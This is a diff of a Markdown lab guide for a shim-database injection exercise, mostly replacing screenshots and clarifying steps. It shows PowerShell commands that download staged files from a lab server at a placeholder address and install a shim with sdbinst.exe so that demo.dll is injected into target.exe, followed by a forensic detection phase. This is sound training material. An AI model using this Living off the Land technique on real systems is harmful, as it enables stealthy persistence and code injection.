@@ -84,7 +84,7 @@ cd ~/BnB/SdbExplorer
 python3 -m http.server 8001
 ```
 
-<img width="607" height="167" alt="image" src="https://github.com/user-attachments/assets/d4a7fdaf-2617-4397-8adf-5a3ecb917bf1" />
+<img width="783" height="176" alt="image" src="https://github.com/user-attachments/assets/e3e94e21-29d6-46c2-9bc5-6dbba317bfd5" />
 
 >[!NOTE]
 > Note down your **\<UBUNTU_IP\>** — you will need it in the next phase.
@@ -96,7 +96,7 @@ The Lab Directory contains four pre-staged files:
 - **patch.sdb** — a Shim Database pre-configured to inject `demo.dll` into `target.exe`.
 - **sdb-explorer.exe** — the forensic analysis tool used in the Blue Team phase.
 
-<img width="628" height="162" alt="image" src="https://github.com/user-attachments/assets/79acf40a-b082-41ce-a299-ca605a76855a" />
+<img width="710" height="217" alt="image" src="https://github.com/user-attachments/assets/4dc151d0-1f0e-4071-bb80-bd47b7006e16" />
 
 ---
 
@@ -120,21 +120,21 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\p
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
 ```
 
-<img width="1492" height="65" alt="image" src="https://github.com/user-attachments/assets/088eb0b7-26ee-42af-b902-c31fbbe048ca" />
+<img width="1640" height="267" alt="image" src="https://github.com/user-attachments/assets/799aec4d-c46e-4ca0-add6-40d445bafaee" />
 
 - Back in the Ubuntu terminal, you should now see four GET requests logged by the Python server — one for each downloaded file:
 
-<img width="649" height="156" alt="image" src="https://github.com/user-attachments/assets/16763bc5-e763-42d8-904f-830f4f860f4e" />
+<img width="840" height="327" alt="image" src="https://github.com/user-attachments/assets/035d6ebc-63ad-4584-911f-adcf012ee794" />
 
-- Now install the Shim Database using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:
+- Now install the Shim Database on the Windows machine using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique. In the **powershell terminal**, type:
 
 ```powershell
-sdbinst.exe "$env:TEMP\patch.sdb"
+C:\Windows\SysWOW64\sdbinst.exe "$env:TEMP\patch.sdb"
 ```
 
 You will see a brief confirmation message. Silently and without any visible indication to a regular user, the OS has now been instructed to inject `demo.dll` into every future instance of `target.exe`.
 
-<img width="898" height="100" alt="image" src="https://github.com/user-attachments/assets/ea0634fc-0046-409a-88c6-ed9631e4402b" />
+<img width="1101" height="100" alt="image" src="https://github.com/user-attachments/assets/343dccdf-8598-442f-8cd2-f0c54c724c30" />
 
 >[!NOTE]
 > **sdbinst.exe requires Administrator privileges.** In a real attack, this means the adversary must have already escalated their privileges before reaching this stage — a realistic assumption on a compromised corporate endpoint.
@@ -145,11 +145,13 @@ You will see a brief confirmation message. Silently and without any visible indi
 
 The shim is now installed and armed. From this point forward, every time `target.exe` is launched — by any user, including after a reboot — the Application Compatibility Engine will silently load `demo.dll` into its memory before the application even starts.
 
-- Open a **NEW, standard PowerShell terminal** (without Administrator privileges) and launch the target application:
+- Open a **NEW, PowerShell terminal** and launch the target application:
 
 ```powershell
 Start-Process C:\Users\Public\target.exe
 ```
+
+<img width="1134" height="717" alt="image" src="https://github.com/user-attachments/assets/fc17239d-054a-4d28-93fd-c1e43d2d28e2" />
 
 Two things happen immediately and in sequence: first, `demo.dll` loads and displays a warning Message Box titled **"SdbExplorer Lab — Shim Active"** and writes a log to `C:\Windows\Temp\shimmed.log`. Then, after you dismiss that popup, `target.exe` itself opens its own window.
 
@@ -157,6 +159,8 @@ The injection order is the key observation: **demo.dll ran before the applicatio
 
 >[!IMPORTANT]
 > Click **OK** on the demo.dll popup, but **leave target.exe open** — you will need the live process for the detection steps below.
+
+<img width="716" height="444" alt="image" src="https://github.com/user-attachments/assets/3e9ca446-c34f-430e-ae0b-e3b018761bed" />
 
 ---
 
